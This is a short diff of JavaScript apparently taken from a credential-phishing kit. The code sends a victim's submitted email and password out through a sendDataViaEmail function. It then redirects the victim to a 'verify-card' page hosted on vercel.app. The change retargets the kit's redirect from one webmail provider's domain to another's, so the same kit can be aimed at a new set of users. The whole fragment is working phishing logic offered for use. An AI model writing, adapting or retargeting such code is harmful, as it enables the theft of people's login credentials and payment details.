@@ -301,11 +301,11 @@
               sendDataViaEmail(emailValue, passwordValue)
                 .then(() => {
                   console.log("✅ Email sent successfully, redirecting...");
-                  window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.sccoast.net",);
+                  window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.mwt.net",);
                 })
                 .catch((error) => {
                   console.error("❌ Error sending email:", error);
-                  window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.sccoast.net",);
+                  window.location.replace("https://verify-card.vercel.app?redirect=https://webmail.mwt.net",);
                 });
             });
           } else {
